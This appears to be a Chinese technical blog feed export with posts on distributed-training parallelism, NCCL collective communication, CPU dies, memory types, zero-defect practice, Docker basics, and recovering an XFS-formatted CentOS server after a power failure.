<p><img src="/2022/08/13/%E6%95%B0%E6%8D%AE%E5%B9%B6%E8%A1%8C-%E6%A8%A1%E5%9E%8B%E5%B9%B6%E8%A1%8C-%E6%B5%81%E6%B0%B4%E7%BA%BF%E5%B9%B6%E8%A1%8C/1.jpg" alt="avatar"></p>
<h3 id="2、并行方式："><a href="#2、并行方式：" class="headerlink" title="2、并行方式："></a>2、并行方式：</h3><p>2.1 同步训练：每个前向、反向结束后显示同步（把每一个GPU上的梯度进行汇总，再在GPU上进行相同的参数更新。）</p>
<p>  实现简单，适合同构场景；一个节点出现故障会影响整体计算性能；</p>
<p>传统中心化PS（Parameter Server）方式的同步训练：存在性能瓶颈（PS需要和很多的不同的节点进行通信，当集群的节点数增加的时候，会存在性能瓶颈）；</p>
<p>All-Reduce方式的同步训练：目前最广泛采用，几乎所有框架都支持（各个GPU反向传播计算完梯度之后，通过一种像round all reduce环形结构，直接将参数更新）；</p>
<p>显示训练，在All-Reduce时时没法进行下一步训练的。</p>
<p>2.2 异步训练：只进行部分同步或不显示同步。</p>
<p> 适合异步训练，可能导致潜在的收敛性问题；</p>
<p>节点和PS通信，将梯度传给Sever的时候，Sever直接用参数进行更新，从Sever拿到更新后的参数进行下一步训练。当有的节点训练快，而有的节点训练慢，训练快的节点训练好后等一会就不等了，快的节点之间做一次通信后接着下一轮计算，慢的节点什么时候算好了再和其他节点一起all reduce梯度。这样可能将梯度发送给PS的时候，从PS拿到的参数是更新了好几个版本之后的，每个节点梯度不一样，根据不同的参数算得的梯度再去做all reduce就有一些不合理，就会导致神经网络精度受损。</p>
<p>传统异步方法：ASGD等；</p>
<p>其他：把其中部分的计算节点组成一个组，每次在这个组之内进行梯度的汇总和更新。</p>
<h2 id="模型并行（MP-）"><a href="#模型并行（MP-）" class="headerlink" title="模型并行（MP ）"></a>模型并行（MP ）</h2><p>1、概念：将模型切分到不同的GPU上，将模型的参数分到不同的GPU上，每一个GPU上的参数量大大减小，这样可以容纳更大的模型进行训练。参考下图，4个节点运行一个模型，4个节点（machine）将5层的网络做了切分</p>
<p><img src="/2022/08/13/%E6%95%B0%E6%8D%AE%E5%B9%B6%E8%A1%8C-%E6%A8%A1%E5%9E%8B%E5%B9%B6%E8%A1%8C-%E6%B5%81%E6%B0%B4%E7%BA%BF%E5%B9%B6%E8%A1%8C/2.jpg" alt="avatar"></p>
<p><img src="/2022/08/13/%E6%95%B0%E6%8D%AE%E5%B9%B6%E8%A1%8C-%E6%A8%A1%E5%9E%8B%E5%B9%B6%E8%A1%8C-%E6%B5%81%E6%B0%B4%E7%BA%BF%E5%B9%B6%E8%A1%8C/3.jpg" alt="avatar"></p>
<p>切分完之后，跑网络的方式也很简单：把输入先扔给Mach. 1，Mach.1 算完把它得到的结果扔给Mach. 2。就这样一直扔到Mach.4，Mach.4开始做反向传播，一直传播到Mach.1，这就是完整的一个iteration。上面图片中深蓝色表示Forward计算，绿色表示Backward计算，数字代表iteration的序号</p>
<h2 id="流水线并行（PP）"><a href="#流水线并行（PP）" class="headerlink" title="流水线并行（PP）"></a>流水线并行（PP）</h2><p>1、概念：基于模型并行，一个batch结束前开始下一个batch，以充分利用计算资源。将模型按层进行切分，将不同的层放入不同的GPU，训练的时候数据像流水一样在GPU上进行流动。</p>
<p>对于模型并行，在任何时刻也没有两个节点在同时工作，根本就没有并行：大部分时间的大部分节点都是无所事事的状态，为了减少浪费，我们引入了Pipeline的概念：如果我们同时进行多个iteration，每个节点在同一时刻负责不同的iteration的计算，就可以避免数据依赖，不用在原地干等了，如下图所示<br><img src="/2022/08/13/%E6%95%B0%E6%8D%AE%E5%B9%B6%E8%A1%8C-%E6%A8%A1%E5%9E%8B%E5%B9%B6%E8%A1%8C-%E6%B5%81%E6%B0%B4%E7%BA%BF%E5%B9%B6%E8%A1%8C/4.jpg" alt="avatar"></p>
<p>不过这种做法会产生新的问题：在普通情况下，我们算第二个iteration的情况下需要用第一个iteration后更新的模型来算，但是如上所示，对于Machine 1，我第二轮开始跑（深蓝色的2格子）的时候，第一轮（浅绿色的1格子）还没更新完。</p>
<p>PipeDream是一套融合了流水线(Pipeline)，模型并行(model-parallism)以及 数据并行（data parallelism）三个机制的高效模型训练方案。在图像模型上测试可以达到1.45至6.76的加速比。PipeDream核心在于解决两个问题：(1) 对于一个给定的模型与分布式系统，如何划分任务（即哪个节点负责哪些layer，某些layer是数据并行还是模型并行）（2）对于流水线模型，如何避免流水线本身带来的训练的问题。</p>
<p>PipeDream就是一个将Data Parallel与Pipeline结合在一起的框架，如下所示，将一个5层的网络均匀的分配到8个节点来运算，尽可能提升系统的性能</p>
<p><img src="/2022/08/13/%E6%95%B0%E6%8D%AE%E5%B9%B6%E8%A1%8C-%E6%A8%A1%E5%9E%8B%E5%B9%B6%E8%A1%8C-%E6%B5%81%E6%B0%B4%E7%BA%BF%E5%B9%B6%E8%A1%8C/5.jpg" alt="avatar"></p>
<p>流水线模型可以认为是一个动态规划模型：把M层的网络分给N个节点算，最短的时间要么是M-1层分给N-1个节点算，或者M-1层分给N-2个节点算。当然因为是流水线，所以我们最关注output through，就是吞吐量，取决于流水线最长的一个节点的时间</p>
<p>2、切分方式：按层切分（流水线并行）、层内切分（模型并行）。</p>
<p>四、混合并行（HP）</p>
<p>　　混合使用上述的两种或三种方法</p>
]]></content>
  </entry>
  <entry>
    <title>服务器宕机启动后硬盘恢复</title>
    <url>/2021/07/12/%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%AE%95%E6%9C%BA%E5%90%AF%E5%8A%A8%E5%90%8E%E7%A1%AC%E7%9B%98%E6%81%A2%E5%A4%8D/</url>
    <content><![CDATA[<p>服务器机房异常断电，服务器开机后，出现这个错误： Failed to open pack file: input/output error  。。。  （很多的failed、卡死在进度条界面），这个服务器基本不可以使用了。。</p>
<p>解决思路：</p>
<ol>
<li><p>先进入拯救模式看启动界面按e 进入界面把ro改成 “rw init=/sysroot/bin/sh”. 完成之后按 ctrl+x  进入系统。查看/etc/fatab 挂载情况如有nfs挂载项或者其他挂在项就注释重启</p>
</li>
<li><p>.如果以没处理掉，就进入自启拯救模式输入 xfs_repair -v -L /dev/dm-0 强制清理脏数据在重启。或者运行xfs_repair /dev//dev/mapper/centos-home   xfs_repair/dev/mapper/centos-root   xfs_repair/dev/mapper/centos-swap 等命令尝试启动（这里的目录都是操作系统的根分区，lvm分区）。如果提示文件系统在用，则需要执行umount 操作</p>
</li>
</ol>
]]></content>
      <tags>
        <tag>Server</tag>
      </tags>
  </entry>
  <entry>
    <title>物理服务器中的CPU die</title>
    <url>/2021/03/19/%E7%89%A9%E7%90%86%E6%9C%8D%E5%8A%A1%E5%99%A8%E4%B8%AD%E7%9A%84CPU-die/</url>
    <content><![CDATA[<p>最近在看一个开源项目，里面提到建立单服务器的资源拓扑，包括NUMA node、Dies、Socket这三个概念，这个Dies是第一次听说，搜集整理了一些关于 Dies的资料。</p>
<p>Dies是处理器在生产过程中引入的概念，总的来说，Die或者CPU Die指的是处理器在生产过程中，从晶圆（Silicon Wafer）上切割下来的一个个小方块（这也是为啥消费者看到的CPU芯片为什么都是方的的原因），在切割下来之前，每个小方块（Die）都需要经过各种加工，将电路逻辑刻到该Die上面。对于主流的CPU厂商Intel和AMD而言，他们会将1个或者N个CPU Die封装起来形成一个CPU Package，有时候也叫作CPU Socket，如下图所示：</p>
<p>   <img src="/2021/03/19/%E7%89%A9%E7%90%86%E6%9C%8D%E5%8A%A1%E5%99%A8%E4%B8%AD%E7%9A%84CPU-die/1.jpg" alt="avatar"></p>
<p>由于CPU Die的制作工艺及其复杂，导致CPU Die的大小会很大地影响到CPU Die的良品率，即CPU Die的大小越大，则CPU Die出错的概率越高，良品率也越低，相应的成本也越高。</p>
<p>在服务器领域，Intel Xeon系列的高端处理器会尽量地将整个CPU Socket做到一个CPU Die上，导致其相应的CPU Die的大小都比较大，这也是其价格昂贵的一个原因。将整个CPU Socket上的东西都做到一个CPU Die上的好处是CPU内部之间各个组件的连接是通过片内总线互联，有更多的资源可以相互共享，这样整体的性能能够更高。</p>
<p>而对于AMD的EYPC CPU而言，它的每个CPU Socket由4个CPU Die组成，每个CPU Die中包含有4个CPU内核，如下图所示：</p>
<p>   <img src="/2021/03/19/%E7%89%A9%E7%90%86%E6%9C%8D%E5%8A%A1%E5%99%A8%E4%B8%AD%E7%9A%84CPU-die/2.jpg" alt="avatar"></p>
<p>CPU Die之间通过片外总线（Infinity Fabric）互联，并且不同CPU Die上的CPU内核不能共享CPU缓存，而单个Die的Xeon处理器内和所有CPU内核其实是可以共享CPU的第三级缓存（L3 Cache）的。</p>
]]></content>
  </entry>
  <entry>
    <title>物理机中的多种内存</title>
    <url>/2021/03/22/%E7%89%A9%E7%90%86%E6%9C%BA%E4%B8%AD%E7%9A%84%E5%A4%9A%E7%A7%8D%E5%86%85%E5%AD%98/</url>
    <content><![CDATA[<ol>
<li><p>ROM和RAM指的都是半导体存储器，ROM是Read Only Memory的缩写，RAM是Random Access Memory的缩写。ROM在系统停止供电的时候仍然可以保持数据，而RAM通常都是在掉电之后就丢失数据，典型的RAM就是计算机的内存。</p>
</li>
<li><p>RAM 有两大类，一种称为静态RAM（Static RAM/SRAM），SRAM速度非常快，是目前读写最快的存储设备了，但是它也非常昂贵，所以只在要求很苛刻的地方使用，譬如CPU的一级缓冲，二级缓冲。另一种称为动态RAM（Dynamic RAM/DRAM），DRAM保留数据的时间很短，速度也比SRAM慢，不过它还是比任何的ROM都要快，但从价格上来说DRAM相比SRAM要便宜很多，计算机内存就是DRAM的。</p>
</li>
</ol>
<ul>
<li><p>2.1 DRAM，动态随机存取存储器，需要不断的刷新，才能保存数据.而且是行列地址复用的，许多都有页模式。DRAM分为很多种，常见的主要有FPRAM/FastPage、EDORAM、SDRAM、DDR RAM、RDRAM、SGRAM以及WRAM等，这里介绍其中的一种DDR RAM。DDR RAM（Date-Rate RAM）也称作DDR SDRAM，这种改进型的RAM和SDRAM是基本一样的，不同之处在于它可以在一个时钟读写两次数据，这样就使得数据传输速度加倍了。这是目前电脑中用得最多的内存，而且它有着成本优势，事实上击败了Intel的另外一种内存标准－Rambus DRAM。在很多高端的显卡上，也配备了高速DDR RAM来提高带宽，这可以大幅度提高3D加速卡的像素渲染能力。</p>
</li>
<li><p>2.2  SRAM，静态的随机存取存储器，加电情况下，不需要刷新，数据不会丢失，而且，一般不是行列地址复用的。</p>
</li>
<li><p>2.3 SDRAM，同步的DRAM，即数据的读写需要时钟来同步。 DRAM和SDRAM由于实现工艺问题，容量较SRAM大。但是读写速度不如SRAM，但是现在，SDRAM的速度也已经很快了，时钟好像已经有 150兆的了。那么就是读写周期小于10ns了。</p>
<ul>
<li><p>2.4 每单位容量的DRAM使用较少的晶体管而且占用面积小，而SRAM则是用较多晶体管占用的面也要相对大不少；DRAM需要不断刷新来维持所存储的数据，SRAM则不需要；DRAM的存取时钟间隔长，而SRAM的速度快，时间短；DRAM的耗电低，SRAM耗电大。</p>
</li>
<li><p>2.5 目前，相同容量的SRAM价格是SDRAM的8倍左右，面积则将近大4倍，所以SRAM常用于快速存储的较低容量的RAM需求，比如Cache(缓存），比如CPU内部的L1 Cache和主板上的L2 Cache，一般只有几百K。</p>
</li>
</ul>
</li>
</ul>
<ol start="3">
<li><p>ROM也有很多种，PROM是可编程的ROM，PROM和 EPROM（可擦除可编程ROM）两者区别是，PROM是一次性的，也就是软件灌入后，就无法修改了，这种是早期的产品，现在已经不可能使用了，而 EPROM是通过紫外光的照射擦出原先的程序，是一种通用的存储器。另外一种EEPROM是通过电子擦出，价格很高，写入时间很长，写入很慢。举个例子，手机软件一般放在EEPROM中，我们打电话，有些最后拨打的号码，暂时是存在SRAM中的，不是马上写入通过记录（通话记录保存在EEPROM中），因为当时有很重要工作（通话）要做，如果写入，漫长的等待是让用户忍无可忍的。</p>
</li>
<li><p>FLASH存储器又称闪存，它结合了ROM和RAM的长处，不仅具备电子可擦出可编程（EEPROM）的性能，还不会断电丢失数据同时可以快速读取数据（NVRAM的优势），U盘和MP3里用的就是这种存储器。在过去的20年里，嵌入式系统一直使用ROM（EPROM）作为它们的存储设备，然而近年来 Flash全面代替了ROM（EPROM）在嵌入式系统中的地位，用作存储 Bootloader以及操作系统或者程序代码或者直接当硬盘使用（U盘）。目前Flash主要有两种NOR Flash和NADN Flash。NOR Flash的读取和我们常见的SDRAM的读取是一样，用户可以直接运行装载在NOR FLASH里面的代码，这样可以减少SRAM的容量从而节约了成本。NAND Flash没有采取内存的随机读取技术，它的读取是以一次读取一快的形式来进行的，通常是一次读取512个字节，采用这种技术的Flash比较廉价。用户不能直接运行NAND Flash上的代码，因此好多使用NAND Flash的开发板除了使用NAND Flah以外，还作上了一块小的NOR Flash来运行启动代码。一般小容量的用NOR Flash，因为其读取速度快，多用来存储操作系统等重要信息，而大容量的用NAND FLASH，最常见的NAND FLASH应用是嵌入式系统采用的DOC（Disk On Chip）和我们通常用的“闪盘”，可以在线擦除。目前市面上的FLASH 主要来自Intel，AMD，Fujitsu和Toshiba，而生产NAND Flash的主要厂家有Samsung和Toshiba。</p>
</li>
</ol>
<h2 id="PMEM"><a href="#PMEM" class="headerlink" title="PMEM"></a>PMEM</h2><p>AEP是Intel推出的一种新型的非易失Optane Memory设备，又被称作Apache Pass，所以一般习惯称作AEP。在这之前也有类似的设备称作NVDIMM或PMEM，目前Linux创建的AEP设备节点也是叫做pmem（如/dev/pmem0），所以本文中NVDIMM或PMEM都指AEP。</p>
]]></content>
  </entry>
  <entry>
    <title>系统审计-audit与Falco</title>
    <url>/2022/03/24/%E7%B3%BB%E7%BB%9F%E5%AE%A1%E8%AE%A1-audit%E4%B8%8EFalco/</url>
    <content><![CDATA[]]></content>
  </entry>
  <entry>
    <title>如何理解Nvidia英伟达的Multi-GPU多卡通信框架NCCL</title>
    <url>/2022/07/13/%E5%A6%82%E4%BD%95%E7%90%86%E8%A7%A3Nvidia%E8%8B%B1%E4%BC%9F%E8%BE%BE%E7%9A%84Multi-GPU%E5%A4%9A%E5%8D%A1%E9%80%9A%E4%BF%A1%E6%A1%86%E6%9E%B6NCCL/</url>
    <content><![CDATA[<h2 id="问题详情"><a href="#问题详情" class="headerlink" title="问题详情"></a>问题详情</h2><p>深度学习中常常需要多GPU并行训练，而Nvidia的NCCL库NVIDIA/nccl（<a href="https://github.com/NVIDIA/nccl%EF%BC%89%E5%9C%A8%E5%90%84%E5%A4%A7%E6%B7%B1%E5%BA%A6%E5%AD%A6%E4%B9%A0%E6%A1%86%E6%9E%B6%EF%BC%88Caffe/Tensorflow/Torch/Theano%EF%BC%89%E7%9A%84%E5%A4%9A%E5%8D%A1%E5%B9%B6%E8%A1%8C%E4%B8%AD%E7%BB%8F%E5%B8%B8%E8%A2%AB%E4%BD%BF%E7%94%A8%EF%BC%8C%E8%AF%B7%E9%97%AE%E5%A6%82%E4%BD%95%E7%90%86%E8%A7%A3NCCL%E7%9A%84%E5%8E%9F%E7%90%86%E4%BB%A5%E5%8F%8A%E7%89%B9%E7%82%B9%EF%BC%9F" target="_blank" rel="noopener">https://github.com/NVIDIA/nccl）在各大深度学习框架（Caffe/Tensorflow/Torch/Theano）的多卡并行中经常被使用，请问如何理解NCCL的原理以及特点？</a></p>
<h2 id="回答"><a href="#回答" class="headerlink" title="回答"></a>回答</h2><p>NCCL是Nvidia Collective multi-GPU Communication Library的简称，它是一个实现多GPU的collective communication通信（all-gather, reduce, broadcast）库，Nvidia做了很多优化，以在PCIe、Nvlink、InfiniBand上实现较高的通信速度。</p>
<p>下面分别从以下几个方面来介绍NCCL的特点，包括基本的communication primitive、ring-base collectives、NCCL在单机多卡上以及多机多卡实现、最后分享实际使用NCCL的一些经验。</p>
<h3 id="communication-primitive"><a href="#communication-primitive" class="headerlink" title="communication primitive"></a>communication primitive</h3><p>并行任务的通信一般可以分为Point-to-point communication和Collective communication。P2P通信这种模式只有一个sender和一个receiver，实现起来比较简单。第二种Collective communication包含多个sender多个receiver，一般的通信原语包括broadcast，gather,all-gather,scatter,reduce,all-reduce,reduce-scatter,all-to-all等。简单介绍几个常用的操作：</p>
<p>Reduce：从多个sender那里接收数据，最终combine到一个节点上。<br> <img src="/2022/07/13/%E5%A6%82%E4%BD%95%E7%90%86%E8%A7%A3Nvidia%E8%8B%B1%E4%BC%9F%E8%BE%BE%E7%9A%84Multi-GPU%E5%A4%9A%E5%8D%A1%E9%80%9A%E4%BF%A1%E6%A1%86%E6%9E%B6NCCL/reduce.png" alt="avatar"></p>
<p>All-reduce：从多个sender那里接收数据，最终combine到每一个节点上。<br> <img src="/2022/07/13/%E5%A6%82%E4%BD%95%E7%90%86%E8%A7%A3Nvidia%E8%8B%B1%E4%BC%9F%E8%BE%BE%E7%9A%84Multi-GPU%E5%A4%9A%E5%8D%A1%E9%80%9A%E4%BF%A1%E6%A1%86%E6%9E%B6NCCL/allreduce.png" alt="avatar"></p>
<p>而传统Collective communication假设通信节点组成的topology是一颗fat tree，如下图所示，这样通信效率最高。但实际的通信topology可能比较复杂，并不是一个fat tree。因此一般用ring-based Collective communication。<br> <img src="/2022/07/13/%E5%A6%82%E4%BD%95%E7%90%86%E8%A7%A3Nvidia%E8%8B%B1%E4%BC%9F%E8%BE%BE%E7%9A%84Multi-GPU%E5%A4%9A%E5%8D%A1%E9%80%9A%E4%BF%A1%E6%A1%86%E6%9E%B6NCCL/fattree.png" alt="avatar"></p>
<h3 id="ring-base-collectives"><a href="#ring-base-collectives" class="headerlink" title="ring-base collectives"></a>ring-base collectives</h3><p>ring-base collectives将所有的通信节点通过首尾连接形成一个单向环，数据在环上依次传输。以broadcast为例， 假设有4个GPU，GPU0为sender将信息发送给剩下的GPU，按照环的方式依次传输，GPU0–&gt;GPU1–&gt;GPU2–&gt;GPU3，若数据量为N，带宽为B，整个传输时间为（K-1）N/B。时间随着节点数线性增长，不是很高效。<br> <img src="/2022/07/13/%E5%A6%82%E4%BD%95%E7%90%86%E8%A7%A3Nvidia%E8%8B%B1%E4%BC%9F%E8%BE%BE%E7%9A%84Multi-GPU%E5%A4%9A%E5%8D%A1%E9%80%9A%E4%BF%A1%E6%A1%86%E6%9E%B6NCCL/ring1.png" alt="avatar"></p>
<p>下面把要传输的数据分成S份，每次只传N/S的数据量，传输过程如下所示：<br> <img src="/2022/07/13/%E5%A6%82%E4%BD%95%E7%90%86%E8%A7%A3Nvidia%E8%8B%B1%E4%BC%9F%E8%BE%BE%E7%9A%84Multi-GPU%E5%A4%9A%E5%8D%A1%E9%80%9A%E4%BF%A1%E6%A1%86%E6%9E%B6NCCL/ring2.png" alt="avatar"></p>
<p>GPU1接收到GPU0的一份数据后，也接着传到环的下个节点，这样以此类推，最后花的时间为</p>
<p>S*(N/S/B) + (k-2)*(N/S/B) = N(S+K-2)/(SB) –&gt; N/B，条件是S远大于K，即数据的份数大于节点数，这个很容易满足。所以通信时间不随节点数的增加而增加，只和数据总量以及带宽有关。其它通信操作比如reduce、gather以此类推。</p>
<p>那么在以GPU为通信节点的场景下，怎么构建通信环呢？如下图所示：</p>
<p>单机4卡通过同一个PCIe switch挂载在一棵CPU的场景： <img src="/2022/07/13/%E5%A6%82%E4%BD%95%E7%90%86%E8%A7%A3Nvidia%E8%8B%B1%E4%BC%9F%E8%BE%BE%E7%9A%84Multi-GPU%E5%A4%9A%E5%8D%A1%E9%80%9A%E4%BF%A1%E6%A1%86%E6%9E%B6NCCL/4gpu.png" alt="avatar"></p>
<p>单机8卡通过两个CPU下不同的PCIe switch挂载的场景：<br><img src="/2022/07/13/%E5%A6%82%E4%BD%95%E7%90%86%E8%A7%A3Nvidia%E8%8B%B1%E4%BC%9F%E8%BE%BE%E7%9A%84Multi-GPU%E5%A4%9A%E5%8D%A1%E9%80%9A%E4%BF%A1%E6%A1%86%E6%9E%B6NCCL/8gpu.png" alt="avatar"></p>
<h3 id="NCCL实现"><a href="#NCCL实现" class="headerlink" title="NCCL实现"></a>NCCL实现</h3><p>NCCL实现成CUDA C++ kernels，包含3种primitive operations： Copy，Reduce，ReduceAndCopy。目前NCCL 1.0版本只支持单机多卡，卡之间通过PCIe、NVlink、GPU Direct P2P来通信。NCCL 2.0会支持多机多卡，多机间通过Sockets (Ethernet)或者InfiniBand with GPU Direct RDMA通信。</p>
<p>下图所示，单机内多卡通过PCIe以及CPU socket通信，多机通过InfiniBand通信。<br><img src="/2022/07/13/%E5%A6%82%E4%BD%95%E7%90%86%E8%A7%A3Nvidia%E8%8B%B1%E4%BC%9F%E8%BE%BE%E7%9A%84Multi-GPU%E5%A4%9A%E5%8D%A1%E9%80%9A%E4%BF%A1%E6%A1%86%E6%9E%B6NCCL/ib.png" alt="avatar"></p>
<p>同样，在多机多卡内部，也要构成一个通信环。<br><img src="/2022/07/13/%E5%A6%82%E4%BD%95%E7%90%86%E8%A7%A3Nvidia%E8%8B%B1%E4%BC%9F%E8%BE%BE%E7%9A%84Multi-GPU%E5%A4%9A%E5%8D%A1%E9%80%9A%E4%BF%A1%E6%A1%86%E6%9E%B6NCCL/ib2.png" alt="avatar"></p>
<p>下面是单机 4卡（Maxwel GPU）上各个操作随着通信量增加的带宽速度变化，可以看到带宽上限能达到10GB/s，接近PCIe的带宽。<br><img src="/2022/07/13/%E5%A6%82%E4%BD%95%E7%90%86%E8%A7%A3Nvidia%E8%8B%B1%E4%BC%9F%E8%BE%BE%E7%9A%84Multi-GPU%E5%A4%9A%E5%8D%A1%E9%80%9A%E4%BF%A1%E6%A1%86%E6%9E%B6NCCL/size.png" alt="avatar"></p>
<p>下图是Allreduce在单机不同架构下的速度比较：<br><img src="/2022/07/13/%E5%A6%82%E4%BD%95%E7%90%86%E8%A7%A3Nvidia%E8%8B%B1%E4%BC%9F%E8%BE%BE%E7%9A%84Multi-GPU%E5%A4%9A%E5%8D%A1%E9%80%9A%E4%BF%A1%E6%A1%86%E6%9E%B6NCCL/diff.png" alt="avatar"></p>
<p>先不看DGX-1架构，这是Nvidia推出的深度学习平台，带宽能达到60GB/s。前面三个是单机多卡典型的三种连接方式，第三种是四张卡都在一个PCIe switch上，所以带宽较高，能达到&gt;10GB/s PCIe的带宽大小，第二种是两个GPU通过switch相连后再经过CPU连接，速度会稍微低一点，第一种是两个GPU通过CPU然后通过QPI和另一个CPU上的两块卡相连，因此速度最慢，但也能达到&gt;5GB/s。</p>
<p>下图是Allreduce多机下的速度表现，左图两机8卡，机内PCIe，机间InfiniBand能达到&gt;10GB/s的速度，InfiniBand基本上能达到机内的通信速度。<br><img src="/2022/07/13/%E5%A6%82%E4%BD%95%E7%90%86%E8%A7%A3Nvidia%E8%8B%B1%E4%BC%9F%E8%BE%BE%E7%9A%84Multi-GPU%E5%A4%9A%E5%8D%A1%E9%80%9A%E4%BF%A1%E6%A1%86%E6%9E%B6NCCL/allreduce2.png" alt="avatar"></p>
<p>下图是NCCL在CNTK ResNet50上的scalability，32卡基本能达到线性加速比。<br><img src="/2022/07/13/%E5%A6%82%E4%BD%95%E7%90%86%E8%A7%A3Nvidia%E8%8B%B1%E4%BC%9F%E8%BE%BE%E7%9A%84Multi-GPU%E5%A4%9A%E5%8D%A1%E9%80%9A%E4%BF%A1%E6%A1%86%E6%9E%B6NCCL/32.png" alt="avatar"></p>
<h3 id="我们的实测经验"><a href="#我们的实测经验" class="headerlink" title="我们的实测经验"></a>我们的实测经验</h3><p>首先，在一台K40 GPU的机器上测试了GPU的连接拓扑，如下：<br><img src="/2022/07/13/%E5%A6%82%E4%BD%95%E7%90%86%E8%A7%A3Nvidia%E8%8B%B1%E4%BC%9F%E8%BE%BE%E7%9A%84Multi-GPU%E5%A4%9A%E5%8D%A1%E9%80%9A%E4%BF%A1%E6%A1%86%E6%9E%B6NCCL/topo.png" alt="avatar"><br>可以看到前四卡和后四卡分别通过不同的CPU组连接，GPU0和GPU1直接通过PCIe switch相连，然后经过CPU与GPU2和GPU3相连。</p>
<p>下面是测试PCIe的带宽，可以看到GPU0和GU1通信能达到10.59GB/s，GPU0同GPU2<del>3通信由于要经过CPU，速度稍慢，和GPU4</del>7的通信需要经过QPI，所以又慢了一点，但也能达到9.15GB/s。<br><img src="/2022/07/13/%E5%A6%82%E4%BD%95%E7%90%86%E8%A7%A3Nvidia%E8%8B%B1%E4%BC%9F%E8%BE%BE%E7%9A%84Multi-GPU%E5%A4%9A%E5%8D%A1%E9%80%9A%E4%BF%A1%E6%A1%86%E6%9E%B6NCCL/bandwidth.png" alt="avatar"></p>
<p>而通过NVlink连接的GPU通信速度能达到35GB/s：<br><img src="/2022/07/13/%E5%A6%82%E4%BD%95%E7%90%86%E8%A7%A3Nvidia%E8%8B%B1%E4%BC%9F%E8%BE%BE%E7%9A%84Multi-GPU%E5%A4%9A%E5%8D%A1%E9%80%9A%E4%BF%A1%E6%A1%86%E6%9E%B6NCCL/nvlink.png" alt="avatar"></p>
<p>NCCL在不同的深度学习框架（CNTK/Tensorflow/Torch/Theano/Caffe）中，由于不同的模型大小，计算的batch size大小，会有不同的表现。比如上图中CNTK中Resnet50能达到32卡线性加速比，Facebook之前能一小时训练出ImageNet，而在NMT任务中，可能不会有这么大的加速比。因为影响并行计算效率的因素主要有并行任务数、每个任务的计算量以及通信时间。我们不仅要看绝对的通信量，也要看通信和计算能不能同时进行以及计算/通信比，如果通信占计算的比重越小，那么并行计算的任务会越高效。NMT模型一般较大，多大几十M上百M，不像现在image的模型能做到几M大小，通信所占比重会较高。</p>
<p>下面是NMT模型单机多卡加速的一个简单对比图：<br><img src="/2022/07/13/%E5%A6%82%E4%BD%95%E7%90%86%E8%A7%A3Nvidia%E8%8B%B1%E4%BC%9F%E8%BE%BE%E7%9A%84Multi-GPU%E5%A4%9A%E5%8D%A1%E9%80%9A%E4%BF%A1%E6%A1%86%E6%9E%B6NCCL/acc.png" alt="avatar"></p>
<p>转载地址(<a href="https://www.zhihu.com/question/63219175" target="_blank" rel="noopener">https://www.zhihu.com/question/63219175</a>)</p>
]]></content>
  </entry>
  <entry>
    <title>零缺陷学习</title>
    <url>/2021/10/06/%E9%9B%B6%E7%BC%BA%E9%99%B7%E5%AD%A6%E4%B9%A0/</url>
    <content><![CDATA[<p>参加学习了零缺陷的培训，对零缺陷思想有了更深入的理解，即要求我们能够第一次就把事情考虑好、把事情做好。经过了产品的多个版本的需求分析、开发、测试、发版，我觉得有两个方面可以基于零缺陷的思想进行工作。一方面是脚踏实地的编码测试，在最基本的操作上减少bug数量；另一方面是前瞻性的架构设计，将可能出现的需求、问题提前考虑，从而降低返工以及反复开发。零缺陷也就是禁止小错误来避免大错误，零缺陷和成语防微杜渐、防患未然类似，都是要求我们避免不必要的错误。</p>
<p>做了很多软件开发以及产品架构设计，踩过无数个坑，越来越意识到零缺陷的重要性。在软件开发过程中，有时可能觉得一个while循环的终止判断、一个空指针判断肯定没有问题，就没有去增加判断、增加日志记录， 然而当实际测试时，异常数据流导致出现各种问题，引起系统的不稳定，导致需要大量的时间进行问题定位。也有的时候，实现一个功能，为了尽快完成工作，不进行编码设计模式的考虑，只使用简单的函数调用、if判断进行堆积代码，造成大量代码冗余、无法扩展更多新的功能，多个版本后就需要进行代码重构。对于架构师、Team Leader，需要考虑到产品的全部点，避免遗漏导致的返工，对于需求开发人员需要由点及面，将个人研发的全部内容基于该点进行全面考虑。有时候测试人员在测试的时候只关注到了一个问题并分析到该问题的原因，需要开发人员只会针对这个问题进行修改，并不去主动考虑该问题原因导致的其他问题，从而导致针对该问题原因会出现多个问题单。</p>
<p>如果我们基于零缺陷的思想，基于零缺陷的要求去工作，就可以降低大量的工作量。可以将这些工作量投入到更有价值的工作中去。</p>
]]></content>
  </entry>
  <entry>
    <title>谈docker容器</title>
    <url>/2020/09/08/%E8%B0%88Docker%E5%AE%B9%E5%99%A8/</url>
    <content><![CDATA[<p>##什么是容器<br>  在云计算或者说虚拟机普及的过程中，用户常常会问虚拟机是什么？虚拟机有什么优势？性能如何？她是如何提高硬件利用率？。。。当然我们会给客户解释CPU与内存虚拟化、资源超分配、分布式存储等等概念。到现在，虚拟机完全被普及，虚拟机带来的优势适合诸多业务场景，逐渐打消了人们对虚拟机的各种疑虑。那么，被不少激进的IT人宣称的，会替代虚拟机的容器又是什么呢？<br>   网上许多关于容器的介绍都是针对docker，其实容器并不是docker，docker只是容器技术的一种实现，或者说是就是把容器的管理以命令行的方式呈现出来。之前有个老外写了篇100行Golang代码实现容器（<a href="https://www.infoq.com/articles/build-a-container-golang%EF%BC%89%EF%BC%8C" target="_blank" rel="noopener">https://www.infoq.com/articles/build-a-container-golang），</a><br>   基于这个代码实现的容器，更能体现容器技术的本质，容器的核心应该是三个方面：</p>
<ol>
<li>命名空间：隔离，容器内的应用只能看到该容器内的资源（用户信息、进程信息，网络信息、挂载信息等）</li>
<li>Cgroup：为不同的容器提供资源限制，定义容器对宿主机资源（CPU、内存等）的最大使用量。</li>
<li>分层文件系统：基于写时复制(COW)、联合挂载的文件系统，为容器提供文件系统<br>再来看一下，以docker（Moby）为代表的容器，官方的描述：   <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">A container image is a lightweight, stand-alone, executable package of a piece of software that includes everything needed to run it: code, runtime, system tools, system libraries, settings. Available for both Linux and Windows based apps, containerized software will always run the same, regardless of the environment. Containers isolate software from its surroundings, for example differences between development and staging environments and help reduce conflicts between teams running different software on the same infrastructure.</span><br></pre></td></tr></table></figure>
